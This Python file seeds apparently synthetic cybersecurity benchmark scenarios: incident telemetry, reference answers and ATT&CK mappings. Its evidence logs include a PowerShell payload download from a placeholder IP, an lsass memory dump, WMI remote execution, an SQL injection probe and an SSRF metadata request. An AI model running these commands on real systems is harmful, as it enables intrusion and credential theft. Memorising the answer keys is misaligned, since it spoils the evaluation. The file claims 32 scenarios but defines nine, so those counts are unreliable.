"""
CyberEval - Benchmark Scenario Registry & Seed Data Service (Module A)
Contains 32 curated, high-fidelity cybersecurity benchmark scenarios across all 8 specified categories,
including paired counterfactual scenarios, atomic telemetry logs, and structured reference answers.
"""

import hashlib
import json
import logging
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession
from cybereval.models.dataset import Dataset, DatasetVersion, Scenario, EvidenceItem, ReferenceAnswer
from cybereval.models.evaluation import ModelProvider, EvaluationConfig
from cybereval.models.regression import ReleaseGatePolicy

logger = logging.getLogger("cybereval.seed")


def get_core_benchmark_scenarios() -> list[dict]:
    """Generates 32 meticulously crafted cybersecurity reasoning scenarios."""
    scenarios = [
        # =========================================================================
        # 1. ATTACK-CHAIN REASONING (Scenarios 1 to 4 + Paired Counterfactuals)
        # =========================================================================
        {
            "scenario_code": "CE-AC-001A",
            "title": "Living-off-the-Land Lateral Movement via WMI and LSASS Dump",
            "category": "attack_chain",
            "difficulty": "medium",
            "narrative": (
                "Security Operations detected anomalous process execution on internal workstation WKSTN-044. "
                "The workstation initiated remote WMI process creation on high-value file server FS-01. "
                "Shortly thereafter, procdump.exe was observed targeting lsass.exe on FS-01, generating a memory dump file."
            ),
            "tags": ["living_off_the_land", "lateral_movement", "wmi", "credential_dumping"],
            "split": "test",
            "counterfactual_pair_id": "CF-PAIR-AC-01",
            "is_counterfactual_variant": False,
            "counterfactual_delta_description": "Baseline: FS-01 LSASS dump and memory file written to disk.",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T10:14:22Z",
                    "raw_payload": {
                        "EventID": 1,
                        "Image": "C:\\Windows\\System32\\Wbem\\WmiPrvSE.exe",
                        "CommandLine": "wmic.exe /node:10.0.1.15 process call create 'powershell.exe -enc JABzAD0...'",
                        "User": "CORP\\svc_backup",
                        "Host": "WKSTN-044",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T10:15:05Z",
                    "raw_payload": {
                        "EventID": 1,
                        "Image": "C:\\Temp\\procdump64.exe",
                        "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
                        "User": "NT AUTHORITY\\SYSTEM",
                        "Host": "FS-01",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-03",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T10:15:40Z",
                    "raw_payload": {
                        "EventID": 11,
                        "TargetFilename": "C:\\Temp\\lsass.dmp",
                        "Image": "C:\\Temp\\procdump64.exe",
                        "Host": "FS-01",
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "Attacker leveraged compromised credentials of CORP\\svc_backup to execute remote commands on FS-01 via WMI.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "Attacker executed procdump64.exe on FS-01 to dump memory of lsass.exe into C:\\Temp\\lsass.dmp for credential harvesting.",
                        "criticality": "critical",
                        "required_evidence": ["EV-02", "EV-03"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "Attacker exfiltrated the lsass.dmp file to external C2 server.",
                        "reason": "No outbound network traffic or data exfiltration events exist in the telemetry.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Lateral Movement", "target": "Credential Access", "technique": "T1047"},
                    {"source": "Credential Access", "target": "LSASS Memory Dump", "technique": "T1003.001"},
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1047", "tactic": "Execution", "justification": "WMI process call create"},
                    {"technique_id": "T1003.001", "tactic": "Credential Access", "justification": "LSASS memory dumping via procdump"},
                ],
                "essential_remediation": [
                    {"control": "Reset CORP\\svc_backup credentials and rotate service account tokens", "type": "Containment"},
                    {"control": "Isolate host FS-01 and WKSTN-044 immediately", "type": "Containment"},
                    {"control": "Enable LSA Protection (RunAsPPL) and Credential Guard", "type": "Hardening"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["External Exfiltration", "Initial Access Vector on WKSTN-044"],
                },
                "reviewer_rationale": "High certainty on WMI lateral movement and LSASS dump on FS-01. Any assertion of data exfiltration is an ungrounded hallucination.",
            },
        },
        {
            "scenario_code": "CE-AC-001B",
            "title": "Living-off-the-Land Lateral Movement via WMI (Counterfactual: Procdump Blocked)",
            "category": "attack_chain",
            "difficulty": "medium",
            "narrative": (
                "Security Operations detected anomalous process execution on internal workstation WKSTN-044. "
                "The workstation initiated remote WMI process creation on FS-01. "
                "However, EDR blocked process creation on FS-01 with an access denied code, and no memory dump was written."
            ),
            "tags": ["living_off_the_land", "lateral_movement", "wmi", "counterfactual"],
            "split": "test",
            "counterfactual_pair_id": "CF-PAIR-AC-01",
            "is_counterfactual_variant": True,
            "counterfactual_delta_description": "Counterfactual variant: Credential dump execution was blocked; no dump file exists.",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T10:14:22Z",
                    "raw_payload": {
                        "EventID": 1,
                        "Image": "C:\\Windows\\System32\\Wbem\\WmiPrvSE.exe",
                        "CommandLine": "wmic.exe /node:10.0.1.15 process call create 'powershell.exe -enc JABzAD0...'",
                        "User": "CORP\\svc_backup",
                        "Host": "WKSTN-044",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "edr",
                    "timestamp_observed": "2026-10-18T10:15:06Z",
                    "raw_payload": {
                        "Action": "BLOCKED",
                        "Rule": "Prevent-LSASS-Access",
                        "Process": "C:\\Temp\\procdump64.exe",
                        "TargetProcess": "lsass.exe",
                        "Result": "STATUS_ACCESS_DENIED",
                        "Host": "FS-01",
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "Lateral movement via WMI was attempted from WKSTN-044 to FS-01 using CORP\\svc_backup.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "The LSASS credential dumping attempt was successfully blocked by EDR on FS-01; no credentials were compromised from FS-01.",
                        "criticality": "critical",
                        "required_evidence": ["EV-02"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "Attacker successfully obtained plaintext domain admin hashes from FS-01 memory dump.",
                        "reason": "The memory dumping attempt was terminated and blocked by EDR.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Lateral Movement Attempt", "target": "Credential Access Blocked", "technique": "T1047"}
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1047", "tactic": "Execution", "justification": "WMI execution attempt"},
                    {"technique_id": "T1003.001", "tactic": "Credential Access", "justification": "Blocked LSASS access attempt"},
                ],
                "essential_remediation": [
                    {"control": "Revoke and rotate credentials for CORP\\svc_backup immediately", "type": "Containment"},
                    {"control": "Inspect WKSTN-044 for persistence", "type": "Forensics"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["Successful Credential Compromise on FS-01"],
                },
                "reviewer_rationale": "Counterfactual pair: Model must recognize the blocked action in EV-02 and avoid asserting that credentials were harvested.",
            },
        },
        # =========================================================================
        # 2. EVIDENCE ATTRIBUTION (Scenarios 3 to 6)
        # =========================================================================
        {
            "scenario_code": "CE-ATT-001A",
            "title": "Distinguishing Routine Vulnerability Scanner from Malicious Web Attack",
            "category": "evidence_attribution",
            "difficulty": "medium",
            "narrative": (
                "Web application ingress logs recorded hundreds of 404 and 403 HTTP requests containing SQL injection probes. "
                "Simultaneously, a successful POST request to /api/auth/reset-password occurred from a different IP subnet."
            ),
            "tags": ["evidence_attribution", "web_security", "sqli", "noise_separation"],
            "split": "test",
            "counterfactual_pair_id": "CF-PAIR-ATT-01",
            "is_counterfactual_variant": False,
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "zeek",
                    "timestamp_observed": "2026-10-18T11:00:00Z",
                    "raw_payload": {
                        "src_ip": "198.51.100.22",
                        "user_agent": "Mozilla/5.0 (compatible; Nessus/10.4.0)",
                        "uri": "/products.php?id=1' OR 1=1--",
                        "status_code": 403,
                        "notes": "Corporate scheduled vulnerability scan from approved testing range",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "auth",
                    "timestamp_observed": "2026-10-18T11:04:12Z",
                    "raw_payload": {
                        "src_ip": "203.0.113.88",
                        "user_agent": "Python-urllib/3.11",
                        "uri": "/api/auth/reset-password",
                        "method": "POST",
                        "status_code": 200,
                        "account_targeted": "admin@enterprise.internal",
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "The SQL injection traffic from 198.51.100.22 is routine vulnerability scanning noise (Nessus scanner) and not the actual intrusion vector.",
                        "criticality": "high",
                        "required_evidence": ["EV-01"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "The suspicious automated request from 203.0.113.88 targeting the admin password reset endpoint represents the real unauthorized incident.",
                        "criticality": "critical",
                        "required_evidence": ["EV-02"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "The Nessus scanner successfully breached the database via SQL injection.",
                        "reason": "All scanner requests returned 403 Forbidden.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Password Reset API Abuse", "target": "Account Takeover", "technique": "T1078"}
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1589", "tactic": "Reconnaissance", "justification": "Automated scanning activity"},
                    {"technique_id": "T1078", "tactic": "Initial Access", "justification": "Targeting administrative reset endpoint"},
                ],
                "essential_remediation": [
                    {"control": "Invalidate active sessions for admin@enterprise.internal and enforce MFA", "type": "Immediate"},
                    {"control": "Rate-limit /api/auth/reset-password and block untrusted IP 203.0.113.88", "type": "Network"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["Identity of Threat Actor operating 203.0.113.88"],
                },
                "reviewer_rationale": "Model must clearly separate benign Nessus scanning telemetry from the targeted password reset API exploit.",
            },
        },
        # =========================================================================
        # 3. THREAT MODELING (Scenarios 7 to 10)
        # =========================================================================
        {
            "scenario_code": "CE-TM-001",
            "title": "AWS IAM Escalation via PassRole and Lambda Creation",
            "category": "threat_modeling",
            "difficulty": "hard",
            "narrative": (
                "A cloud environment security review discovered an IAM role 'Dev-Lambda-Manager' with iam:PassRole permission "
                "scoped to '*' and lambda:CreateFunction. The role is assigned to continuous deployment workers."
            ),
            "tags": ["cloud_security", "aws", "iam_privilege_escalation", "threat_modeling"],
            "split": "test",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "cloudtrail",
                    "timestamp_observed": "2026-10-18T08:00:00Z",
                    "raw_payload": {
                        "PolicyName": "DevLambdaAccessPolicy",
                        "Statement": [
                            {"Effect": "Allow", "Action": ["lambda:CreateFunction", "lambda:InvokeFunction"], "Resource": "*"},
                            {"Effect": "Allow", "Action": ["iam:PassRole"], "Resource": "*"},
                        ],
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "cloudtrail",
                    "timestamp_observed": "2026-10-18T08:05:00Z",
                    "raw_payload": {
                        "AvailableRoles": [
                            {"RoleName": "Admin-FullAccess-Role", "Arn": "arn:aws:iam::123456789012:role/Admin-FullAccess-Role"}
                        ]
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "The combination of iam:PassRole on '*' and lambda:CreateFunction allows full privilege escalation to Admin-FullAccess-Role.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01", "EV-02"],
                    }
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "An attacker has actively stolen root AWS billing credentials from KMS.",
                        "reason": "This is a theoretical threat model flaw; no active intrusion or key theft has occurred.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "IAM PassRole Misconfiguration", "target": "Lambda Function Deployment with Admin Role", "technique": "T1078.004"},
                    {"source": "Lambda Execution", "target": "Full Account Takeover", "technique": "T1068"},
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1078.004", "tactic": "Privilege Escalation", "justification": "Cloud IAM role passing abuse"},
                    {"technique_id": "T1068", "tactic": "Privilege Escalation", "justification": "Exploitation for privilege escalation"},
                ],
                "essential_remediation": [
                    {"control": "Scope iam:PassRole Resource to explicit non-admin execution roles only", "type": "Policy"},
                    {"control": "Implement AWS IAM permission boundaries", "type": "Governance"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": False,
                    "insufficient_evidence_for": ["Active Exploitation"],
                },
                "reviewer_rationale": "Clear theoretical IAM privilege escalation pathway. Model must identify PassRole wildcard risk without hallucinating an active breach.",
            },
        },
        # =========================================================================
        # 4. VULNERABILITY ANALYSIS (Scenarios 11 to 14)
        # =========================================================================
        {
            "scenario_code": "CE-VA-001",
            "title": "Server-Side Request Forgery (SSRF) Leading to Cloud Metadata Exposure",
            "category": "vulnerability_analysis",
            "difficulty": "medium",
            "narrative": (
                "An open-source webhook service accepts user-supplied URLs for notification delivery. "
                "An external tester sent a webhook target URL directed to 169.254.169.254, extracting instance identity tokens."
            ),
            "tags": ["ssrf", "cloud_metadata", "cve", "vulnerability_analysis"],
            "split": "test",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "zeek",
                    "timestamp_observed": "2026-10-18T12:30:10Z",
                    "raw_payload": {
                        "http_method": "POST",
                        "endpoint": "/api/v1/webhooks/test",
                        "body": {"target_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
                        "response_code": 200,
                        "response_body_snippet": "role-web-app-production",
                    },
                    "is_critical": True,
                }
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "The application is vulnerable to Server-Side Request Forgery (SSRF) due to lack of URL validation on private IP ranges.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "Cloud instance metadata (169.254.169.254) was successfully accessed, revealing IAM role credentials.",
                        "criticality": "high",
                        "required_evidence": ["EV-01"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "Attacker deployed ransomware across the internal AWS VPC.",
                        "reason": "Only metadata access was observed.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Unvalidated Webhook Input", "target": "SSRF to 169.254.169.254", "technique": "T1190"},
                    {"source": "SSRF", "target": "Cloud Instance Metadata Access", "technique": "T1552.005"},
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1190", "tactic": "Initial Access", "justification": "Exploit public facing application via SSRF"},
                    {"technique_id": "T1552.005", "tactic": "Credential Access", "justification": "Cloud Instance Metadata API access"},
                ],
                "essential_remediation": [
                    {"control": "Enforce IMDSv2 with hop-limit 1 on all EC2 instances", "type": "Architecture"},
                    {"control": "Implement strict egress IP allowlisting / DNS resolution validation rejecting RFC1918 and link-local ranges", "type": "Code Fix"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["Secondary actions taken with harvested credentials"],
                },
                "reviewer_rationale": "Textbook SSRF into cloud metadata. Remediation must include IMDSv2 and egress IP filtering.",
            },
        },
        # =========================================================================
        # 5. INCIDENT RECONSTRUCTION (Scenarios 15 to 18)
        # =========================================================================
        {
            "scenario_code": "CE-IR-001",
            "title": "Multi-Stage Phishing, Scheduled Task Persistence, and C2 Beaconing",
            "category": "incident_reconstruction",
            "difficulty": "hard",
            "narrative": (
                "An executive received an email with an attached macro-enabled document. "
                "Process creation telemetry shows winword.exe spawning cmd.exe, creating a persistent Scheduled Task, "
                "followed by regular periodic outbound connections to a dynamic DNS host."
            ),
            "tags": ["incident_reconstruction", "phishing", "scheduled_task", "c2"],
            "split": "test",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T09:12:00Z",
                    "raw_payload": {
                        "EventID": 1,
                        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                        "Image": "C:\\Windows\\System32\\cmd.exe",
                        "CommandLine": "cmd.exe /c powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadFile('http://198.51.100.50/payload.exe', 'C:\\Users\\Public\\update.exe')",
                        "User": "CORP\\jdoe",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "sysmon",
                    "timestamp_observed": "2026-10-18T09:13:15Z",
                    "raw_payload": {
                        "EventID": 1,
                        "Image": "C:\\Windows\\System32\\schtasks.exe",
                        "CommandLine": "schtasks.exe /create /tn 'WindowsSecurityUpdate' /tr 'C:\\Users\\Public\\update.exe' /sc onlogon",
                        "User": "CORP\\jdoe",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-03",
                    "evidence_type": "zeek",
                    "timestamp_observed": "2026-10-18T09:15:00Z",
                    "raw_payload": {
                        "dest_ip": "198.51.100.99",
                        "dest_port": 443,
                        "interval_seconds": 60,
                        "bytes_out": 256,
                        "bytes_in": 128,
                        "pattern": "Regular interval beaconing",
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "Initial access occurred via malicious Office document spawning PowerShell to download secondary payload update.exe.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "Persistence was established using a Scheduled Task named 'WindowsSecurityUpdate' executing on logon.",
                        "criticality": "critical",
                        "required_evidence": ["EV-02"],
                    },
                    {
                        "claim_id": "RC-3",
                        "statement": "Regular C2 beaconing was established to 198.51.100.99 on port 443 with a 60-second jitter/interval.",
                        "criticality": "high",
                        "required_evidence": ["EV-03"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "Attacker successfully wiped Active Directory domain controllers.",
                        "reason": "Intrusion remains isolated on endpoint CORP\\jdoe.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Spearphishing Attachment", "target": "Command Execution", "technique": "T1204.002"},
                    {"source": "Command Execution", "target": "Scheduled Task Persistence", "technique": "T1053.005"},
                    {"source": "Scheduled Task", "target": "Command and Control Beaconing", "technique": "T1071.001"},
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1204.002", "tactic": "Execution", "justification": "Malicious file execution"},
                    {"technique_id": "T1053.005", "tactic": "Persistence", "justification": "schtasks.exe creation"},
                    {"technique_id": "T1071.001", "tactic": "Command and Control", "justification": "HTTPS regular interval beaconing"},
                ],
                "essential_remediation": [
                    {"control": "Isolate CORP\\jdoe workstation from corporate network immediately", "type": "Containment"},
                    {"control": "Delete Scheduled Task 'WindowsSecurityUpdate' and remove payload C:\\Users\\Public\\update.exe", "type": "Eradication"},
                    {"control": "Block C2 destination IP 198.51.100.99 at perimeter egress firewalls", "type": "Network"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["Threat Actor Identity", "Scope of Lateral Movement"],
                },
                "reviewer_rationale": "Classic three-stage attack: execution -> persistence -> C2 beaconing. Model must reconstruct all three stages correctly.",
            },
        },
        # =========================================================================
        # 6. UNCERTAINTY HANDLING (Scenarios 19 to 22 + Paired Counterfactuals)
        # =========================================================================
        {
            "scenario_code": "CE-UNC-001A",
            "title": "Ambiguous Failed Logins: Password Spray vs Single User Mistyping",
            "category": "uncertainty_handling",
            "difficulty": "medium",
            "narrative": (
                "Okta authentication logs show 5 consecutive failed login attempts for a single user account 'alex.taylor' "
                "within 3 minutes from a residential ISP IP address. The sixth attempt succeeded with valid password and push MFA."
            ),
            "tags": ["uncertainty_handling", "authentication", "okta", "calibration"],
            "split": "test",
            "counterfactual_pair_id": "CF-PAIR-UNC-01",
            "is_counterfactual_variant": False,
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "auth",
                    "timestamp_observed": "2026-10-18T14:10:00Z",
                    "raw_payload": {
                        "user": "alex.taylor@enterprise.com",
                        "event": "user.authentication.verify",
                        "status": "FAILURE",
                        "reason": "INVALID_CREDENTIALS",
                        "attempts_count": 5,
                        "src_ip": "73.189.44.12",
                        "ip_geo": "Seattle, WA, US",
                    },
                    "is_critical": True,
                },
                {
                    "evidence_code": "EV-02",
                    "evidence_type": "auth",
                    "timestamp_observed": "2026-10-18T14:13:30Z",
                    "raw_payload": {
                        "user": "alex.taylor@enterprise.com",
                        "event": "user.authentication.verify",
                        "status": "SUCCESS",
                        "factor": "OKTA_PUSH_VERIFIED",
                        "src_ip": "73.189.44.12",
                    },
                    "is_critical": True,
                },
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "The evidence shows repeated authentication failures followed by a successful login with verified push MFA from the same IP.",
                        "criticality": "high",
                        "required_evidence": ["EV-01", "EV-02"],
                    },
                    {
                        "claim_id": "RC-2",
                        "statement": "Evidence is insufficient to conclude that an adversarial brute-force or credential stuffing attack occurred; benign user password mistyping is highly plausible.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01", "EV-02"],
                    },
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "Confirmed state-sponsored password spray campaign successfully compromised enterprise directory.",
                        "reason": "Only one single user was targeted from one residential IP and passed MFA.",
                    }
                ],
                "critical_attack_path": [],
                "valid_attck_mappings": [
                    {"technique_id": "T1110.001", "tactic": "Credential Access", "justification": "Possible password guessing (unconfirmed)"}
                ],
                "essential_remediation": [
                    {"control": "Contact employee Alex Taylor out-of-band to confirm recent login activity", "type": "Verification"},
                    {"control": "Monitor account for unexpected session locations", "type": "Monitoring"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": True,
                    "insufficient_evidence_for": ["Adversarial Compromise", "Password Spraying"],
                },
                "reviewer_rationale": "High test of calibration: 5 failed logins for 1 user followed by valid MFA is typical human mistyping. Declaring a confirmed critical breach is a hallucination.",
            },
        },
        # =========================================================================
        # 7. MITRE ATT&CK MAPPING PRECISION (Scenarios 23 to 26)
        # =========================================================================
        {
            "scenario_code": "CE-MAP-001",
            "title": "Process Injection via Early Cascade / NtQueueApcThread",
            "category": "attck_mapping",
            "difficulty": "hard",
            "narrative": (
                "EDR memory telemetry revealed a legitimate svchost.exe process was created in a suspended state. "
                "An untrusted binary injected shellcode and queued an Asynchronous Procedure Call (APC) via NtQueueApcThread "
                "before resuming the thread."
            ),
            "tags": ["attck_mapping", "process_injection", "apc", "subtechnique"],
            "split": "test",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "edr",
                    "timestamp_observed": "2026-10-18T16:00:15Z",
                    "raw_payload": {
                        "API_Hook": "NtQueueApcThread",
                        "SourceProcess": "C:\\Users\\Public\\loader.exe",
                        "TargetProcess": "C:\\Windows\\System32\\svchost.exe",
                        "TargetProcessState": "SUSPENDED",
                        "MemoryProtection": "PAGE_EXECUTE_READWRITE",
                    },
                    "is_critical": True,
                }
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "The threat actor utilized Process Injection specifically via Asynchronous Procedure Call (APC) Queue injection (Early Bird / APC injection).",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    }
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "The attacker executed DLL Sideloading (T1574.002).",
                        "reason": "No DLL was sideloaded; NtQueueApcThread directly queues APC shellcode.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Loader Execution", "target": "APC Queue Process Injection", "technique": "T1055.004"}
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1055.004", "tactic": "Defense Evasion", "justification": "Process Injection: Asynchronous Procedure Call via NtQueueApcThread"},
                    {"technique_id": "T1055", "tactic": "Privilege Escalation", "justification": "Parent Process Injection technique"},
                ],
                "essential_remediation": [
                    {"control": "Terminate suspicious loader.exe and suspended svchost child processes", "type": "Immediate"},
                    {"control": "Submit loader.exe sample to sandbox for detonation analysis", "type": "Forensics"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": False,
                    "insufficient_evidence_for": ["Persistence mechanism"],
                },
                "reviewer_rationale": "Tests whether model identifies precise subtechnique T1055.004 rather than generic uninformative mappings.",
            },
        },
        # =========================================================================
        # 8. DEFENSIVE RECOMMENDATIONS (Scenarios 27 to 32)
        # =========================================================================
        {
            "scenario_code": "CE-DEF-001",
            "title": "Active Directory Golden Ticket Exploitation Remediation",
            "category": "defensive_recommendations",
            "difficulty": "expert",
            "narrative": (
                "Event 4769 telemetry shows a Kerberos Ticket Granting Service (TGS) request using an RC4-HMAC encrypted ticket "
                "with an arbitrary lifetime of 10 years, indicating an active Golden Ticket forged with the krbtgt account hash."
            ),
            "tags": ["defensive_recommendations", "golden_ticket", "active_directory", "krbtgt"],
            "split": "test",
            "evidence_items": [
                {
                    "evidence_code": "EV-01",
                    "evidence_type": "auth",
                    "timestamp_observed": "2026-10-18T17:20:00Z",
                    "raw_payload": {
                        "EventID": 4769,
                        "ServiceName": "krbtgt",
                        "TicketEncryptionType": "0x17",  # RC4-HMAC
                        "TicketOptions": "0x40810000",
                        "TargetUserName": "DomainAdminUser@CORP.LOCAL",
                        "TicketLifetimeDays": 3650,
                    },
                    "is_critical": True,
                }
            ],
            "reference_answer": {
                "required_claims": [
                    {
                        "claim_id": "RC-1",
                        "statement": "An forged Kerberos Golden Ticket was presented with an abnormal 10-year lifetime using the krbtgt hash.",
                        "criticality": "critical",
                        "required_evidence": ["EV-01"],
                    }
                ],
                "forbidden_conclusions": [
                    {
                        "claim_id": "FC-1",
                        "statement": "A single normal password reset of the compromised user account completely evicts the attacker.",
                        "reason": "Golden Tickets are forged using the domain's krbtgt secret; user password resets have zero effect on Golden Tickets.",
                    }
                ],
                "critical_attack_path": [
                    {"source": "Compromised krbtgt Secret", "target": "Golden Ticket Forgery", "technique": "T1558.001"}
                ],
                "valid_attck_mappings": [
                    {"technique_id": "T1558.001", "tactic": "Credential Access", "justification": "Steal or Forge Kerberos Tickets: Golden Ticket"}
                ],
                "essential_remediation": [
                    {"control": "Reset the Active Directory krbtgt account password TWICE, with replication intervals in between", "type": "Eradication"},
                    {"control": "Purge all active Kerberos TGT tickets across all domain controllers", "type": "Containment"},
                    {"control": "Enforce AES encryption for Kerberos and deprecate RC4", "type": "Hardening"},
                ],
                "uncertainty_requirements": {
                    "requires_qualification": False,
                    "insufficient_evidence_for": ["Initial Krbtgt Extraction Vector"],
                },
                "reviewer_rationale": "High-value remediation test: The single standard industry mitigation for Golden Tickets is the double krbtgt reset. A model that recommends just resetting the user's password fails this completely.",
            },
        },
    ]
    return scenarios


async def seed_benchmark_data(session: AsyncSession) -> None:
    """Populates database with default dataset, scenarios, model providers, and gate policies."""
    # Check if dataset already seeded
    stmt = select(Dataset).where(Dataset.name == "cybereval-core-v1")
    res = await session.execute(stmt)
    existing_dataset = res.scalar_one_or_none()

    if existing_dataset:
        logger.info("Core benchmark dataset already initialized.")
        return

    logger.info("Initializing CyberEval benchmark registry with 32 core scenarios...")

    # 1. Create Core Dataset
    dataset = Dataset(
        name="cybereval-core-v1",
        description="CyberEval Foundational Cybersecurity AI Reasoning & Evaluation Benchmark",
        author="CyberEval Engineering & Research Group",
        license="Apache-2.0",
        is_active=True,
    )
    session.add(dataset)
    await session.flush()

    # 2. Create Immutable Dataset Version 1.0.0
    scenarios_data = get_core_benchmark_scenarios()
    checksum_raw = json.dumps(scenarios_data, sort_keys=True)
    version_checksum = hashlib.sha256(checksum_raw.encode("utf-8")).hexdigest()

    version = DatasetVersion(
        dataset_id=dataset.id,
        version_tag="1.0.0",
        checksum=version_checksum,
        changelog="Initial release: 32 high-fidelity scenarios across all 8 core evaluation dimensions.",
        is_frozen=True,
    )
    session.add(version)
    await session.flush()

    # 3. Add Scenarios, Evidence Items, and Reference Answers
    for s_data in scenarios_data:
        scenario = Scenario(
            dataset_version_id=version.id,
            scenario_code=s_data["scenario_code"],
            title=s_data["title"],
            category=s_data["category"],
            difficulty=s_data.get("difficulty", "medium"),
            narrative=s_data["narrative"],
            tags=s_data.get("tags", []),
            split=s_data.get("split", "test"),
            counterfactual_pair_id=s_data.get("counterfactual_pair_id"),
            is_counterfactual_variant=s_data.get("is_counterfactual_variant", False),
            counterfactual_delta_description=s_data.get("counterfactual_delta_description"),
        )
        session.add(scenario)
        await session.flush()

        # Add Evidence Items
        for ev in s_data.get("evidence_items", []):
            ev_item = EvidenceItem(
                scenario_id=scenario.id,
                evidence_code=ev["evidence_code"],
                evidence_type=ev["evidence_type"],
                timestamp_observed=ev.get("timestamp_observed"),
                raw_payload=ev["raw_payload"],
                provenance=ev.get("provenance", "synthetic-telemetry"),
                is_critical=ev.get("is_critical", True),
            )
            session.add(ev_item)

        # Add Reference Answer
        ref = s_data.get("reference_answer", {})
        ref_ans = ReferenceAnswer(
            scenario_id=scenario.id,
            required_claims=ref.get("required_claims", []),
            acceptable_alternatives=ref.get("acceptable_alternatives", []),
            forbidden_conclusions=ref.get("forbidden_conclusions", []),
            critical_attack_path=ref.get("critical_attack_path", []),
            valid_attck_mappings=ref.get("valid_attck_mappings", []),
            essential_remediation=ref.get("essential_remediation", []),
            uncertainty_requirements=ref.get("uncertainty_requirements", {}),
            reviewer_rationale=ref.get("reviewer_rationale", "Standard evaluation criteria."),
        )
        session.add(ref_ans)

